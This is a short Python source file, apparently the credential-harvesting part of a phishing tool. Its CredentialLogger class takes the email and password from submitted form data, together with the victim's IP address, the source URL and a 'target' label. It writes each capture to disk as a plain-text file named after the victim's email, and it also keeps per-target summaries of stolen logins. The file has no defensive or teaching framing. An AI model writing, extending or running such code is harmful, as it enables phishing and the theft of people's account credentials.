import os
import datetime


class CredentialLogger:
    def __init__(self, capture_path, target_name):
        self.capture_path = capture_path
        self.target_name = target_name
        self.credentials = []
        self._setup_paths()

    def _setup_paths(self):
        os.makedirs(self.capture_path, exist_ok=True)
        os.makedirs(os.path.join(self.capture_path, "credentials"), exist_ok=True)

    def _now(self):
        return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

    def log_credential(self, source_url, form_data, client_ip, user_agent=None):
        entry = {
            "timestamp": self._now(),
            "target": self.target_name,
            "source": source_url,
            "ip": client_ip,
            "email": form_data.get("email", [""])[0],
            "password": form_data.get("password", [""])[0],
        }
        self.credentials.append(entry)
        self._save_to_disk(entry)

    def _save_to_disk(self, entry):
        if not entry["email"]:
            return
        ts = entry["timestamp"]
        safe_email = entry["email"].replace("@", "_at_").replace(".", "_dot_")
        filename = f"{self.target_name}_{safe_email}_{ts}.txt"
        filepath = os.path.join(self.capture_path, "credentials", filename)
        with open(filepath, "w") as f:
            f.write(f"Tiempo: {ts}\n")
            f.write(f"Target: {entry['target']}\n")
            f.write(f"IP: {entry['ip']}\n")
            f.write(f"Email: {entry['email']}\n")
            f.write(f"Password: {entry['password']}\n")

    def log_request(self, method, url, headers, body, client_ip):
        pass

    def get_summary(self):
        return {
            "total_credentials": len(self.credentials),
            "unique_ips": len(set(c["ip"] for c in self.credentials)),
        }
